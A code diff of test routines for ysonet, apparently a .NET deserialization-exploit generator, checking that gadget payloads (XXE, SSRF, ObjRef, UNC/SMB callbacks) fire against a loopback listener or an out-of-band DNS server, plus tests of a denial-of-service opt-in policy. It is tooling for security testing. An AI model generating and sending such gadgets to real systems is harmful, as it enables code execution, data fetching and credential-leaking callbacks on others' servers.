@@ -5006,22 +8936,135 @@ namespace ysonet.Tests
 
         private static void FireNetNonRceListener(string gadget, string formatter, bool minify, List<string> failures, ref int fired, bool trace)
         {
-            string label = "NetNonRce " + gadget + " " + formatter + (minify ? " --minify" : "");
+            string label = gadget + " " + formatter + (minify ? " --minify" : "");
             if (trace) { Console.Error.WriteLine("    [fire] " + label + " (listener)"); Console.Error.Flush(); }
             using (var listener = new LoopbackListener())
             {
                 try
                 {
-                    var argv = minify
-                        ? new[] { "-g", gadget, "-f", formatter, "-i", listener.HttpUrl, "-t", "--minify" }
-                        : new[] { "-g", gadget, "-f", formatter, "-i", listener.HttpUrl, "-t" };
-                    IPlugin p = PluginRegistry.CreatePluginInstance("NetNonRceGadgets");
-                    ResetPluginStatics(p == null ? null : p.GetType());
-                    RunSTA(delegate { PayloadRunner.RunPlugin("NetNonRceGadgets", argv); });
-                    if (listener.Fired(3000)) fired++;
+                    InputArgs input = new InputArgs();
+                    input.Cmd = listener.HttpUrl;
+                    input.Minify = minify;
+                    input.Test = true;
+                    RunResult result = null;
+                    RunSTA(delegate
+                    {
+                        result = PayloadRunner.GenerateGadget(new GenerationRequest
+                        {
+                            GadgetName = gadget,
+                            FormatterName = formatter,
+                            InputArgs = input,
+                        });
+                    });
+                    if (result == null || !result.Success)
+                    {
+                        failures.Add("fire " + label + ": generation failed: "
+                            + (result == null ? "no result" : result.ErrorMessage));
+                        return;
+                    }
+                    if (listener.Fired(3000)) { fired++; RuntimeBuild.RecordFired(gadget); }
                     else failures.Add("fire " + label + ": listener not hit");
                 }
                 catch (Exception ex) { failures.Add("fire " + label + ": " + ex.Message); }
+            }
+        }
+
+        // DataViewManagerXxe cannot fire in the test process: its effect depends on the
+        // PRE-4.5.2 XML resolver default, and System.Xml decides that once per process from
+        // the entry assembly's target framework (see ysonet.Tests/LegacyXmlChild.cs). So
+        // generate here, deserialize in a child stamped with the moniker under test, and let
+        // the loopback listener in THIS process decide whether the DTD was fetched.
+        //
+        // legacy=true is the positive case (the request must arrive); legacy=false is the
+        // hardened-default control (it must NOT), which is what stops a false positive from
+        // some other component fetching the URL.
+        private static void FireDataViewManagerXxe(string formatter, bool minify, bool legacy,
+            List<string> failures, ref int fired, ref int skipped, bool trace)
+        {
+            string label = "DataViewManagerXxe " + formatter + (minify ? " --minify" : "")
+                + (legacy ? " [legacy 4.5.1]" : " [hardened 4.7.2]");
+            if (trace) { Console.Error.WriteLine("    [fire] " + label); Console.Error.Flush(); }
+
+            string moniker = legacy ? LegacyXmlChild.LegacyMoniker : LegacyXmlChild.HardenedMoniker;
+            string childExe = LegacyXmlChild.EnsureBuilt(moniker);
+            if (childExe == null)
+            {
+                skipped++;
+                Console.WriteLine("  [SKIP] fire " + label + ": cannot build the legacy XML child on this machine ("
+                    + LegacyXmlChild.LastError + ")");
+                return;
+            }
+
+            string payloadFile = TestArtifactPath("ysonet_fire_dvmxxe_"
+                + formatter + (minify ? "_min" : "") + (legacy ? "_legacy" : "_hardened") + ".bin");
+            SafeDelete(payloadFile);
+
+            using (var listener = new LoopbackListener())
+            {
+                try
+                {
+                    InputArgs input = new InputArgs();
+                    input.Cmd = listener.HttpUrl + ".dtd";
+                    input.Minify = minify;
+                    input.Test = false;   // the effect must come from the CHILD, not from here
+
+                    RunResult result = PayloadRunner.GenerateGadget(new GenerationRequest
+                    {
+                        GadgetName = "DataViewManagerXxe",
+                        FormatterName = formatter,
+                        InputArgs = input,
+                    });
+                    if (result == null || !result.Success)
+                    {
+                        failures.Add("fire " + label + ": generation failed: "
+                            + (result == null ? "no result" : result.ErrorMessage));
+                        return;
+                    }
+
+                    byte[] payloadBytes = result.Raw as byte[];
+                    if (payloadBytes == null)
+                    {
+                        string payloadText = result.Raw as string;
+                        if (payloadText == null)
+                        {
+                            failures.Add("fire " + label + ": unexpected payload type "
+                                + (result.Raw == null ? "null" : result.Raw.GetType().Name));
+                            return;
+                        }
+                        payloadBytes = new UTF8Encoding(false).GetBytes(payloadText);
+                    }
+                    File.WriteAllBytes(payloadFile, payloadBytes);
+
+                    string childOutput = LegacyXmlChild.Run(childExe, formatter, payloadFile, 60000);
+
+                    // The child must actually have had the resolver default we asked for. A
+                    // silent flip here would turn the whole matrix into a no-op that passes.
+                    string wanted = legacy ? "legacyXml=True" : "legacyXml=False";
+                    if (childOutput.IndexOf(wanted, StringComparison.Ordinal) < 0)
+                    {
+                        failures.Add("fire " + label + ": child did not report " + wanted
+                            + "; output was: " + childOutput.Trim());
+                        return;
+                    }
+
+                    bool hit = listener.Fired(legacy ? MarkerWaitMs : 2000);
+                    if (legacy)
+                    {
+                        if (hit) { fired++; RuntimeBuild.RecordFired("DataViewManagerXxe"); }
+                        else
+                            failures.Add("fire " + label + ": no DTD request arrived. child output: "
+                                + childOutput.Trim());
+                    }
+                    else
+                    {
+                        if (hit)
+                            failures.Add("fire " + label
+                                + ": a DTD request arrived under the HARDENED default, which must not happen");
+                        else fired++;
+                    }
+                }
+                catch (Exception ex) { failures.Add("fire " + label + ": " + ex.Message); }
+                finally { SafeDelete(payloadFile); }
             }
         }
 
@@ -5046,7 +9089,7 @@ namespace ysonet.Tests
                     RunResult r = PayloadRunner.GenerateGadget(req);
                     if (!r.Success || !(r.Raw is string)) { failures.Add("fire ObjectDataProvider v3: generate -> " + (r.Success ? "not string" : r.ErrorMessage)); return; }
                     RunSTA(delegate { SerializersHelper.Xaml_deserialize((string)r.Raw); });
-                    if (listener.Fired(3000)) fired++;
+                    if (listener.Fired(3000)) { fired++; RuntimeBuild.RecordFired("ObjectDataProvider"); }
                     else failures.Add("fire ObjectDataProvider v3 (xamlurl SSRF): listener not hit");
                 }
                 catch (Exception ex) { failures.Add("fire ObjectDataProvider v3: " + ex.Message); }
@@ -5086,7 +9129,7 @@ namespace ysonet.Tests
                         return;
                     }
                     RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])r.Raw); });
-                    if (listener.Fired(3000)) fired++;
+                    if (listener.Fired(3000)) { fired++; RuntimeBuild.RecordFired("ObjRef"); }
                     else { skipped++; Console.Error.WriteLine("  [skip] fire ObjRef: listener not hit (remoting client channel did not emit)"); }
                 }
                 catch (Exception ex) { skipped++; Console.Error.WriteLine("  [skip] fire ObjRef: " + ex.Message); }
@@ -5096,6 +9139,167 @@ namespace ysonet.Tests
                         try { System.Runtime.Remoting.Channels.ChannelServices.UnregisterChannel(channel); } catch { }
                 }
             }
+        }
+
+        // ---- 6.4 out-of-band callback observation (OOB tier) -------------------
+        //
+        // Some effects cannot be observed in process. The SMB/UNC callback is the case
+        // that forced this: the effect is an outbound SMB connection made by
+        // Win32Native.GetLongPathNameW while normalizing a path, SMB is fixed at port
+        // 445, and the Windows SMB client owns the loopback UNC path, so LoopbackListener
+        // (an ephemeral TCP port) cannot see it.
+        //
+        // What makes it testable anywhere: Windows must RESOLVE the host name before it
+        // can open the SMB connection. A recorded DNS query for a host name only this run
+        // knows is proof that the callback was attempted, and DNS gets out even when
+        // outbound 445 is blocked by a firewall or an ISP. So a DNS interaction is a
+        // positive result with or without a completed SMB session.
+        //
+        // The observation endpoint is interactsh (OobSession in Oob.cs). Nothing here
+        // runs unless the maintainer passes --oob / sets YSONET_OOB_TESTS, no host name
+        // is hardcoded in the repo (the client mints one per run), and
+        // YSONET_INTERACTSH_SERVER points the whole thing at a self-hosted server.
+
+        // The server is polled once a second, and a DNS query has to travel through the
+        // machine's resolver chain first, so allow a generous ceiling. A healthy run
+        // reports in a few seconds; the ceiling is only paid when nothing calls out.
+        private const int OobWaitMs = 60000;
+
+        // How long to let the control case call out before concluding it did not. It is
+        // issued at the same time as the positive case, which has already been waited
+        // for, so this is only a settling margin.
+        private const int OobControlSettleMs = 10000;
+
+        // Gadgets whose whole effect is an outbound UNC/SMB callback, so an out-of-band
+        // interaction is the only honest proof they fire. Columns: gadget name,
+        // formatter, deserializer tag for DeserializeAs. A row whose gadget is not
+        // registered yet logs a skip naming it, so this workflow is ready the day the
+        // gadget lands (see dev-kitchen/ideas/gadget-filesysteminfo-smb-callback.md).
+        private static readonly string[][] UncCallbackRows = new string[][]
+        {
+            new string[] { "FileSystemInfo", "BinaryFormatter", "bf" },
+        };
+
+        // Prove the observation mechanism and the trigger shape in one run, with a
+        // control that makes the positive result mean something.
+        private static void UncShortNameExpansionIsObservedOutOfBand()
+        {
+            string reason;
+            using (OobSession oob = OobSession.TryStart(ResolveTestArtifactDir(), out reason))
+            {
+                if (oob == null) { Console.Error.WriteLine("  [skip] out-of-band: " + reason); return; }
+                Console.Error.WriteLine("  [oob] endpoint: " + oob.ServerDescription);
+
+                string label = oob.NewLabel("unc");
+                string control = oob.NewLabel("plain");
+
+                // Path.GetFullPath is the same framework entry point the gadget reaches:
+                // FileSystemInfo's deserialization constructor calls
+                // Path.GetFullPathInternal, which normalizes and expands the short name.
+                NormalizeIgnoringErrors(oob.ShortNameUncPath(label));
+                NormalizeIgnoringErrors(oob.PlainUncPath(control));
+
+                string protocols;
+                bool hit = oob.Observed(label, OobWaitMs, out protocols);
+                AssertTrue(hit, "no out-of-band interaction for " + oob.HostFor(label) + " within "
+                    + (OobWaitMs / 1000) + "s: the short-name UNC path did not call out");
+                Console.Error.WriteLine("  [oob] short-name UNC observed over: " + protocols);
+
+                // Control. The same host shape WITHOUT a "~" component must not be looked
+                // up at all: mscorlib only calls GetLongPathNameW when a path component
+                // holds a "~" and is 12 characters or fewer. Without this check, a hit
+                // above would not prove the short-name expansion caused it.
+                System.Threading.Thread.Sleep(OobControlSettleMs);
+                string controlProtocols = oob.ProtocolsFor(control);
+                AssertEqual("", controlProtocols, "a plain UNC path (no short-name component) must not"
+                    + " call out; it did, so the positive result above does not isolate the expansion"
+                    + " (host " + oob.HostFor(control) + ")");
+            }
+        }
+
+        // The runtime effect coverage for every UNC/SMB callback gadget.
+        private static void UncCallbackGadgetsAreObservedOutOfBand()
+        {
+            var failures = new List<string>();
+            int fired = 0, skipped = 0;
+            bool trace = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
+            string reason;
+            using (OobSession oob = OobSession.TryStart(ResolveTestArtifactDir(), out reason))
+            {
+                if (oob == null) { Console.Error.WriteLine("  [skip] out-of-band: " + reason); return; }
+                Console.Error.WriteLine("  [oob] endpoint: " + oob.ServerDescription);
+                foreach (string[] row in UncCallbackRows)
+                {
+                    if (!GadgetIsRegistered(row[0]))
+                    {
+                        skipped++;
+                        Console.Error.WriteLine("  [skip] fire " + row[0] + ": gadget is not registered yet");
+                        continue;
+                    }
+                    FireUncCallbackGadget(oob, row[0], row[1], row[2], failures, ref fired, trace);
+                }
+            }
+            Console.Error.WriteLine("  [oob] gadgets observed: " + fired + ", skipped: " + skipped);
+            if (failures.Count > 0)
+                throw new Exception(string.Join("; ", failures.ToArray()));
+        }
+
+        // Generate a UNC-callback gadget's payload pointed at a run-unique host under the
+        // OOB domain, deserialize it in process, and wait for the interaction.
+        private static void FireUncCallbackGadget(OobSession oob, string gadget, string formatter,
+            string deserAs, List<string> failures, ref int fired, bool trace)
+        {
+            if (RefuseToFireDosGadget(gadget, failures)) return;
+            string label = oob.NewLabel(gadget.ToLowerInvariant());
+            string uncPath = oob.ShortNameUncPath(label);
+            if (trace) { Console.Error.WriteLine("    [fire] " + gadget + " -> " + uncPath); Console.Error.Flush(); }
+            try
+            {
+                InputArgs ia = new InputArgs();
+                ia.Cmd = uncPath;
+                ia.Test = false; // the gadget's own self-test must not make THIS machine call out
+                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+                {
+                    GadgetName = gadget,
+                    FormatterName = formatter,
+                    OutputFormat = "",
+                    InputArgs = ia,
+                });
+                if (!r.Success)
+                {
+                    failures.Add("fire " + gadget + " (" + formatter + "): generate -> " + r.ErrorMessage);
+                    return;
+                }
+                RunSTA(delegate { DeserializeAs(deserAs, r.Raw); });
+
+                string protocols;
+                if (oob.Observed(label, OobWaitMs, out protocols))
+                {
+                    fired++;
+                    RuntimeBuild.RecordFired(gadget);
+                    Console.Error.WriteLine("  [oob] " + gadget + " (" + formatter + ") observed over: " + protocols);
+                }
+                else
+                {
+                    failures.Add("fire " + gadget + " (" + formatter + "): no out-of-band interaction for "
+                        + oob.HostFor(label) + " within " + (OobWaitMs / 1000) + "s");
+                }
+            }
+            catch (Exception ex) { failures.Add("fire " + gadget + " (" + formatter + "): " + ex.Message); }
+        }
+
+        // Normalize a UNC path the way FileSystemInfo's deserialization constructor does.
+        // It can throw AFTER the connection attempt (the host answers nothing useful),
+        // and the attempt is what is being measured, so the exception is not interesting.
+        private static void NormalizeIgnoringErrors(string path)
+        {
+            try { Path.GetFullPath(path); } catch { }
+        }
+
+        private static bool GadgetIsRegistered(string gadget)
+        {
+            try { return GadgetRegistry.CreateGadgetInstance(gadget) != null; }
+            catch { return false; }
         }
 
         private static bool WaitForDir(string path, int totalMs)
@@ -5211,6 +9415,406 @@ namespace ysonet.Tests
                 throw new Exception(msg + " (expected '" + expected + "', got '" + actual + "')");
         }
 
+        // ---- Denial-of-service policy tests ------------------------------------
+        //
+        // The category is facet-driven: a gadget is a DoS gadget when its facets
+        // declare denial-of-service, on the gadget or on one variant. No gadget
+        // declares it yet, so the registry-driven parts below are written to become
+        // live the moment one does, and the pure policy is proved here with fakes
+        // from DosFakes.cs (kept out of the catalogue by the TestingArena rule).
+
+        private static void DosPolicyDetectsVariantLevelFacet()
+        {
+            IGenerator dos = new ysonet.Tests.Helpers.TestingArena.DosFakeGenerator();
+            IGenerator variantDos = new ysonet.Tests.Helpers.TestingArena.DosVariantFakeGenerator();
+            IGenerator safe = new ysonet.Tests.Helpers.TestingArena.SafeFakeGenerator();
+
+            AssertTrue(DosPolicy.IsDosGadget(dos), "a gadget-level facet is detected");
+            AssertTrue(DosPolicy.IsDosGadget(variantDos), "a DoS in one variant makes the whole gadget DoS");
+            AssertTrue(!DosPolicy.IsDosGadget(safe), "an ordinary gadget is not DoS");
+            AssertTrue(!DosPolicy.IsDosGadget((IGenerator)null), "a null gadget is not DoS");
+            AssertTrue(!DosPolicy.IsDosGadget("NoSuchGadget"), "an unknown name is not DoS");
+
+            // The fakes must stay invisible to the catalogue; otherwise they would
+            // join every gadget list, help screen, and generation matrix.
+            foreach (string name in GadgetRegistry.GetAllGadgetNames())
+                AssertTrue(name != "DosFake" && name != "DosVariantFake" && name != "SafeFake",
+                    "test fakes are not registered gadgets (found " + name + ")");
+        }
+
+        private static void DosPolicyAgreesWithFacetExpansion()
+        {
+            // DosPolicy reads the facets directly instead of calling
+            // GadgetFacetReader.Expand, so a metadata mistake fails the metadata
+            // tests rather than breaking every generation. This keeps the two
+            // readings in step for every real gadget and for the fakes.
+            var subjects = new List<IGenerator>();
+            foreach (string name in GadgetRegistry.GetAllGadgetNames())
+            {
+                if (name == "Generic") continue;
+                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
+                if (g != null) subjects.Add(g);
+            }
+            subjects.Add(new ysonet.Tests.Helpers.TestingArena.DosFakeGenerator());
+            subjects.Add(new ysonet.Tests.Helpers.TestingArena.DosVariantFakeGenerator());
+            subjects.Add(new ysonet.Tests.Helpers.TestingArena.SafeFakeGenerator());
+            AssertTrue(subjects.Count > 3, "found gadgets to compare");
+
+            foreach (IGenerator g in subjects)
+            {
+                bool viaExpansion = false;
+                foreach (GadgetCapability cap in GadgetFacetReader.Expand(g))
+                    if (cap.Kinds.Contains(PayloadKind.DenialOfService))
+                        viaExpansion = true;
+                AssertEqual(viaExpansion, DosPolicy.IsDosGadget(g),
+                    "the two DoS readings agree for " + g.Name());
+            }
+        }
+
+        private static void DosRefusalMessageNamesTheFlag()
+        {
+            // The literal is asserted on purpose: renaming the flag must not quietly
+            // leave users without a way forward.
+            AssertEqual("--i-understand-dos", DosPolicy.AckFlagName, "the flag name is stable");
+            AssertEqual("i-understand-dos", DosPolicy.AckOptionName, "the option name is stable");
+
+            string msg = DosPolicy.RefusalMessage("SomeDosGadget");
+            AssertTrue(msg.Contains("SomeDosGadget"), "the refusal names the gadget");
+            AssertTrue(msg.Contains("--i-understand-dos"), "the refusal names the flag");
+            AssertTrue(msg.ToLowerInvariant().Contains("denial-of-service"), "the refusal says why");
+
+            AssertTrue(DosPolicy.RefusalIfUnacknowledged("ObjectDataProvider", false) == null,
+                "an ordinary gadget is never refused");
+            AssertTrue(DosPolicy.RefusalIfUnacknowledged("NoSuchGadget", false) == null,
+                "an unknown gadget is left to the caller's own error");
+        }
+
+        private static void DosWarningTextIsActionable()
+        {
+            IGenerator dos = new ysonet.Tests.Helpers.TestingArena.DosFakeGenerator();
+            string w = DosPolicy.WarningText(dos);
+            AssertTrue(w.Contains("WARNING"), "the banner is marked as a warning");
+            AssertTrue(w.Contains("DosFake"), "the banner names the gadget");
+            AssertTrue(w.Contains("terminate the target process"), "the banner states the effect");
+            AssertTrue(w.ToLowerInvariant().Contains("authorized"), "the banner states the authorization rule");
+            AssertTrue(w.Contains("Test-only fake, generates nothing real."),
+                "the gadget's own AdditionalInfo is kept, not generalized away");
+
+            AssertEqual("", DosPolicy.WarningText("NoSuchGadget"), "an unknown name yields no banner");
+
+            // The interactive preview marker, and the check the renderers use to
+            // draw it in the error color.
+            AssertEqual("", DosPolicy.PreviewWarning("ObjectDataProvider"),
+                "an ordinary gadget gets no preview warning");
+            AssertTrue(DosPolicy.IsPreviewWarning("  " + DosPolicy.PreviewMarker + " - ..."),
+                "a marked line is recognised for colouring");
+            AssertTrue(!DosPolicy.IsPreviewWarning("Formatters: BinaryFormatter"),
+                "an ordinary preview line is not coloured");
+
+            AssertEqual("", DosPolicy.SkipNotice(0), "nothing is said when nothing was skipped");
+            AssertTrue(DosPolicy.SkipNotice(1).Contains(DosPolicy.AckFlagName),
+                "the skip notice says how to run one deliberately");
+            AssertTrue(DosPolicy.SkipNotice(3).Contains("3"), "the skip notice shows the count");
+        }
+
+        private static void DosAcknowledgementSurvivesInputArgsCopy()
+        {
+            InputArgs ia = new InputArgs();
+            AssertTrue(!ia.DosAcknowledged, "nothing is acknowledged by default");
+
+            ia.DosAcknowledged = true;
+            ia.ExtraArguments = new List<string> { "--variant", "2" };
+            InputArgs copy = ia.DeepCopy();
+            AssertTrue(copy.DosAcknowledged, "DeepCopy preserves the acknowledgement");
+
+            // It is global execution context, never a gadget option: a gadget's own
+            // option parsing must never see it.
+            foreach (string a in copy.ExtraArguments)
+                AssertTrue(a.IndexOf(DosPolicy.AckOptionName, StringComparison.OrdinalIgnoreCase) < 0,
+                    "the flag is not in ExtraArguments");
+            foreach (string a in copy.ExtraInternalArguments)
+                AssertTrue(a.IndexOf(DosPolicy.AckOptionName, StringComparison.OrdinalIgnoreCase) < 0,
+                    "the flag is not in ExtraInternalArguments");
+        }
+
+        private static void GenericGeneratorRefusesDosWithoutAcknowledgement()
+        {
+            IGenerator dos = new ysonet.Tests.Helpers.TestingArena.DosFakeGenerator();
+            InputArgs plain = new InputArgs();
+
+            string refusal = "";
+            try { dos.GenerateWithInit("BinaryFormatter", plain); }
+            catch (Exception ex) { refusal = ex.Message; }
+            AssertTrue(refusal.Contains(DosPolicy.AckFlagName),
+                "the wrapper refuses and names the flag (got '" + refusal + "')");
+
+            // GenerateWithNoTest and GenerateInner both flow through the wrapper, so
+            // no ordinary generation path can slip past it.
+            AssertThrows(delegate { dos.GenerateWithNoTest("BinaryFormatter", plain); },
+                "GenerateWithNoTest is refused too");
+            AssertThrows(delegate { dos.GenerateInner("BinaryFormatter", plain); },
+                "GenerateInner is refused too");
+            AssertThrows(delegate { dos.GenerateWithInit("BinaryFormatter", null); },
+                "a missing InputArgs is not an acknowledgement");
+
+            InputArgs acked = new InputArgs();
+            acked.DosAcknowledged = true;
+            AssertTrue(!RawIsEmpty(dos.GenerateWithInit("BinaryFormatter", acked)),
+                "an acknowledged run proceeds");
+            AssertTrue(!RawIsEmpty(dos.GenerateInner("BinaryFormatter", acked)),
+                "the acknowledgement survives the inner-gadget copy");
+
+            // An ordinary gadget is completely unaffected.
+            IGenerator safe = new ysonet.Tests.Helpers.TestingArena.SafeFakeGenerator();
+            AssertTrue(!RawIsEmpty(safe.GenerateWithInit("BinaryFormatter", plain)),
+                "a non-DoS gadget still generates without any flag");
+        }
+
+        private static void DosBulkPartitionExcludesEveryDosGadget()
+        {
+            var names = new List<string>(GadgetRegistry.GetAllGadgetNames());
+            AssertTrue(names.Count > 0, "found gadgets to partition");
+
+            BulkGadgetPartition byName = DosPolicy.PartitionBulkGadgets(names);
+            AssertEqual(names.Count, byName.Safe.Count + byName.Skipped.Count,
+                "every gadget is classified exactly once");
+            foreach (string n in byName.Safe)
+            {
+                AssertTrue(!byName.IsSkipped(n), "the safe and skipped sets are disjoint: " + n);
+                AssertTrue(!DosPolicy.IsDosGadget(n), "no DoS gadget stays in the run set: " + n);
+            }
+            foreach (string n in byName.Skipped)
+                AssertTrue(DosPolicy.IsDosGadget(n), "only DoS gadgets are skipped: " + n);
+
+            // The instance overload (used by the interactive run-all) classifies the
+            // same way as the name overload (used by the CLI --raf loop).
+            var gadgets = new List<IGenerator>();
+            foreach (string n in names)
+            {
+                IGenerator g = GadgetRegistry.CreateGadgetInstance(n);
+                if (g != null) gadgets.Add(g);
+            }
+            BulkGadgetPartition byInstance = DosPolicy.PartitionBulkGadgets(gadgets);
+            AssertEqual(byName.Skipped.Count, byInstance.Skipped.Count,
+                "both bulk paths skip the same gadgets");
+            foreach (string n in byInstance.Skipped)
+                AssertTrue(byName.IsSkipped(n), "instance partition skips the same names: " + n);
+        }
+
+        private static void DosAcknowledgementCommandEcho()
+        {
+            var extra = new List<string> { "--variant", "2" };
+
+            List<string> withAck = CommandEcho.GadgetTokens("SomeGadget", "BinaryFormatter",
+                "calc.exe", false, false, "", "", "", false, false, false, false, true, extra);
+            int count = 0;
+            foreach (string t in withAck)
+                if (t == DosPolicy.AckFlagName) count++;
+            AssertEqual(1, count, "the acknowledgement is emitted exactly once");
+
+            // It is a global flag, so it must never appear among the gadget's own
+            // option tokens.
+            foreach (string t in extra)
+                AssertTrue(t != DosPolicy.AckFlagName, "the flag is never a gadget option");
+
+            List<string> without = CommandEcho.GadgetTokens("SomeGadget", "BinaryFormatter",
+                "calc.exe", false, false, "", "", "", false, false, false, false, false, extra);
+            AssertTrue(!without.Contains(DosPolicy.AckFlagName),
+                "nothing is emitted when the run was not acknowledged");
+
+            List<string> legacy = CommandEcho.GadgetTokens("SomeGadget", "BinaryFormatter",
+                "calc.exe", false, false, "", "", "", false, false, false, false, extra);
+            AssertTrue(!legacy.Contains(DosPolicy.AckFlagName),
+                "the original overload is unchanged");
+        }
+
+        private static void DosAcknowledgementFieldFollowsSelections()
+        {
+            // The acknowledgement is a field, not a typed confirmation: the warning
+            // banner is the real signal. It is offered only when the selection would
+            // actually build a DoS payload, so it never becomes a box people tick out
+            // of habit. No gadget declares the facet yet, so today every gadget must
+            // hide it and never emit it.
+            var session = new WizardSession();
+            var editor = new ModuleEditor(null, null, true, null, session);
+
+            var fields = editor.BuildFieldsForTest("DataSet");
+            EditableField ack = FindEditable(fields, DosPolicy.AckOptionName);
+            AssertTrue(ack != null, "the acknowledgement field object exists");
+            AssertTrue(ack.Hidden, "it is hidden for a gadget that is not a DoS gadget");
+
+            // Even if a value were carried over in session memory, a hidden field is
+            // never emitted (the same guard the bridged chain uses).
+            ack.Value = "true"; ack.Touched = true;
+            string cmd = editor.GadgetCommandLineForTest();
+            AssertTrue(cmd.IndexOf(DosPolicy.AckOptionName, StringComparison.OrdinalIgnoreCase) < 0,
+                "a hidden acknowledgement is not emitted: " + cmd);
+
+            // The three plugins that let the user pick an inner gadget expose the
+            // same flag as a plugin option, so the acknowledgement reaches them
+            // through their own argv instead of an ambient static.
+            foreach (string pluginName in new string[] { "ViewState", "Resx", "SharePoint" })
+            {
+                IPlugin p = PluginRegistry.CreatePluginInstance(pluginName);
+                AssertTrue(p != null, pluginName + " loads");
+                var opts = CliListing.PluginOptions(pluginName);
+                AssertTrue(opts.Contains(DosPolicy.AckFlagName),
+                    pluginName + " exposes " + DosPolicy.AckFlagName);
+            }
+        }
+
+        private static void DosGadgetsAreContained()
+        {
+            // The coverage guard. It derives the DoS set from facets (never a name
+            // list), so a future DoS gadget is covered the moment it declares one.
+            var dosNames = new List<string>();
+            foreach (string name in GadgetRegistry.GetAllGadgetNames())
+                if (DosPolicy.IsDosGadget(name))
+                    dosNames.Add(name);
+
+            BulkGadgetPartition bulk = DosPolicy.PartitionBulkGadgets(GadgetRegistry.GetAllGadgetNames());
+            AssertEqual(dosNames.Count, bulk.Skipped.Count,
+                "every DoS gadget is left out of the shared bulk run set");
+
+            if (dosNames.Count == 0)
+            {
+                // Nothing declares the facet yet. Say so rather than reporting a pass
+                // that checked nothing.
+                Console.Error.WriteLine("  [info] no gadget declares denial-of-service yet; "
+                    + "the fakes cover the policy and this guard goes live with the first one");
+                return;
+            }
+
+            // A bridge consumer for the --bgc precedence check, picked from the
+            // catalogue rather than hardcoded.
+            string bridgeConsumer = null;
+            foreach (string name in GadgetRegistry.GetAllGadgetNames())
+            {
+                IGenerator cand = GadgetRegistry.CreateGadgetInstance(name);
+                if (cand != null && cand.Labels().Contains(GadgetTags.Bridged)
+                    && !string.IsNullOrEmpty(cand.SupportedBridgedFormatter()))
+                {
+                    bridgeConsumer = name;
+                    break;
+                }
+            }
+
+            // A DoS gadget need not take a shell command (FileLogTraceListener takes a
+            // path), so the sample input follows the gadget's declared input type, the
+            // same way the normal-tier sweep does.
+            string csFixture = WriteTestArtifact("ysonet_dos_fixture.cs",
+                "public class YsonetDosFixture { public YsonetDosFixture() { } }");
+            string dllFixture = new Uri(typeof(OptionSet).Assembly.CodeBase).LocalPath;
+            string contentFixture = ContentFixture();
+
+            try
+            {
+            foreach (string name in dosNames)
+            {
+                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
+                AssertTrue(g != null, "DoS gadget loads: " + name);
+                string formatter = g.SupportedFormatters()[0].Split(' ')[0];
+                string sample = SampleInputForGadget(g.CommandInput(), csFixture, dllFixture, contentFixture);
+
+                InputArgs plain = new InputArgs();
+                plain.Cmd = sample;
+                RunResult refused = PayloadRunner.GenerateGadget(new GenerationRequest
+                {
+                    GadgetName = name,
+                    FormatterName = formatter,
+                    OutputFormat = "",
+                    InputArgs = plain,
+                });
+                AssertTrue(!refused.Success, name + " must be refused without the acknowledgement");
+                AssertTrue((refused.ErrorMessage ?? "").Contains(DosPolicy.AckFlagName),
+                    name + " refusal must name the flag (got '" + refused.ErrorMessage + "')");
+
+                // The gadget must be out of the automatic sweeps, which is what keeps
+                // the default suite from ever building it.
+                AssertTrue(bulk.IsSkipped(name), name + " must be out of the shared bulk run set");
+
+                // In a --bgc chain the missing acknowledgement is reported before the
+                // bridge compatibility rules, so the reason is deterministic. This
+                // refusal builds nothing, so it runs in every tier.
+                if (bridgeConsumer != null)
+                {
+                    RunResult chained = PayloadRunner.GenerateGadget(new GenerationRequest
+                    {
+                        GadgetName = bridgeConsumer,
+                        FormatterName = "BinaryFormatter",
+                        BridgedGadgetChain = name,
+                        OutputFormat = "",
+                        InputArgs = new InputArgs(),
+                    });
+                    AssertTrue(!chained.Success, name + " in a chain must be refused too");
+                    AssertTrue((chained.ErrorMessage ?? "").Contains(DosPolicy.AckFlagName),
+                        name + " chain refusal must name the flag, not a bridge error (got '"
+                        + chained.ErrorMessage + "')");
+                }
+
+                // Building the payload is the one part that needs a deliberate
+                // decision, so it is opt-in (--dos / YSONET_DOS_TESTS). The default
+                // run proves containment only and never produces a DoS payload.
+                if (!_dosGenerationAllowed)
+                {
+                    Console.Error.WriteLine("  [skip] not building " + name
+                        + " (denial-of-service; re-run with --dos to include it)");
+                    continue;
+                }
+
+                foreach (string formatterEntry in g.SupportedFormatters())
+                {
+                    string acknowledgedFormatter = formatterEntry.Split(' ')[0];
+                    foreach (bool minify in new[] { false, true })
+                    {
+                        InputArgs acked = new InputArgs();
+                        acked.Cmd = sample;
+                        acked.Minify = minify;
+                        acked.DosAcknowledged = true;
+                        RunResult allowed = PayloadRunner.GenerateGadget(new GenerationRequest
+                        {
+                            GadgetName = name,
+                            FormatterName = acknowledgedFormatter,
+                            OutputFormat = "",
+                            InputArgs = acked,
+                        });
+                        string cell = name + " -f " + acknowledgedFormatter
+                            + (minify ? " --minify" : "");
+                        AssertTrue(allowed.Success, cell + " must generate once acknowledged: " + allowed.ErrorMessage);
+                        AssertTrue(allowed.Warnings.Count > 0, cell + " must return its warning with the payload");
+                        AssertTrue(allowed.Warnings[0].Contains(name), cell + " warning must name the gadget");
+                    }
+                }
+
+                // After acknowledgement an unbridgeable DoS gadget may still fail on
+                // the ordinary bridge rules; it just must not still report a missing
+                // acknowledgement.
+                if (bridgeConsumer != null)
+                {
+                    InputArgs chainAcked = new InputArgs();
+                    chainAcked.Cmd = sample;
+                    chainAcked.DosAcknowledged = true;
+                    RunResult chainOk = PayloadRunner.GenerateGadget(new GenerationRequest
+                    {
+                        GadgetName = bridgeConsumer,
+                        FormatterName = "BinaryFormatter",
+                        BridgedGadgetChain = name,
+                        OutputFormat = "",
+                        InputArgs = chainAcked,
+                    });
+                    AssertTrue(chainOk.Success
+                        || (chainOk.ErrorMessage ?? "").IndexOf(DosPolicy.AckFlagName, StringComparison.Ordinal) < 0,
+                        name + " acknowledged chain must not still report a missing acknowledgement");
+                }
+            }
+            }
+            finally
+            {
+                try { File.Delete(csFixture); } catch { }
+                try { File.Delete(contentFixture); } catch { }
+            }
+        }
+
         // ---- Category facet tests ---------------------------------------------
 
         private static void FacetVocabularyIsBroadAndValid()
@@ -5234,6 +9838,177 @@ namespace ysonet.Tests
